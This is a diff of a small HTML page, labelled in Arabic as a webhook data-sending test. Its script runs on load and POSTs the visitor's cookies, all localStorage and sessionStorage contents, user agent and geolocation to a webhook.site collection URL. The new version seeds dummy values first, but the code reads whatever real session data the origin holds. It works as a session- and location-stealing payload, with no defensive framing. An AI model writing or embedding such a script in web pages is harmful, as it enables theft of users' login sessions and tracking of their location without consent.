@@ -1,43 +1,47 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webhook Test</title>
+    <title>إرسال بيانات إلى Webhook</title>
 </head>
 <body>
-    <h1>Welcome to Webhook Test Page</h1>
-    <p>This page will send data to Webhook.site.</p>
-
+    <h1>اختبار إرسال البيانات إلى Webhook.site</h1>
     <script>
-        // Function to send data to Webhook
-        function sendDataToWebhook() {
-            navigator.geolocation.getCurrentPosition(function(position) {
-                fetch("https://webhook.site/0d8243d9-5449-4c2c-91c1-02c3820c31b6", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        cookies: document.cookie,  // إرسال الكوكيز
-                        sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),  // إرسال بيانات الجلسات
-                        localStorage: Object.fromEntries(Object.entries(localStorage)),  // إرسال بيانات التخزين المحلي
-                        userAgent: navigator.userAgent,  // نوع المتصفح والجهاز
-                        time: new Date().toISOString(),  // الوقت الحالي
-                        location: {  // إرسال الموقع الجغرافي
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        }
-                    })
-                })
-                .then(response => response.json())
-                .then(data => console.log("Data sent successfully:", data))
-                .catch(error => console.log("Error sending data:", error));
-            }, function(error) {
-                console.log("Error getting geolocation: ", error);
-            });
-        }
+        // 1. إضافة بعض الكوكيز يدويًا
+        document.cookie = "user=JohnDoe; path=/";
+        document.cookie = "session=12345; path=/";
 
-        // Call the function when the page loads
-        window.onload = sendDataToWebhook;
+        // 2. إضافة بعض البيانات إلى localStorage و sessionStorage
+        localStorage.setItem('username', 'testUser');
+        localStorage.setItem('email', 'test@example.com');
+        sessionStorage.setItem('sessionId', '12345');
+        sessionStorage.setItem('lastLogin', '2025-04-16');
+
+        // 3. إرسال بيانات الموقع الجغرافي
+        navigator.geolocation.getCurrentPosition(function(position) {
+            // 4. إرسال البيانات إلى Webhook.site
+            fetch("https://webhook.site/0d8243d9-5449-4c2c-91c1-02c3820c31b6", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    cookies: document.cookie,  // إرسال الكوكيز
+                    sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),  // إرسال بيانات الجلسات
+                    localStorage: Object.fromEntries(Object.entries(localStorage)),  // إرسال بيانات التخزين المحلي
+                    userAgent: navigator.userAgent,  // نوع المتصفح والجهاز
+                    time: new Date().toISOString(),  // الوقت الحالي
+                    location: {  // إرسال الموقع الجغرافي
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    }
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log("تم إرسال البيانات بنجاح:", data))
+            .catch(error => console.log("حدث خطأ أثناء إرسال البيانات:", error));
+        }, function(error) {
+            console.log("حدث خطأ في الحصول على الموقع الجغرافي: ", error);
+        });
     </script>
 </body>
 </html>
